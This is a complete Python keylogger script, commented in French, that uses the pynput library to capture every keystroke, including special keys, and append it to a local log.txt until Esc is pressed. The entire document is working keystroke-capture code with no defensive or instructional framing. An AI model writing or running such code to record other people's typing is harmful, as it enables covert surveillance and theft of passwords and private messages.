from pynput import keyboard

def on_press(key):
    """recupere les touches presses"""

    try:
        with open("log.txt","a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open("log.txt","a") as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open("log.txt","a") as f:
                f.write("\n")
        else:
            with open("log.txt","a") as f:
                f.write(f"[{key}]")


def on_release(key):
    """enregistre la touche relachee"""

    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()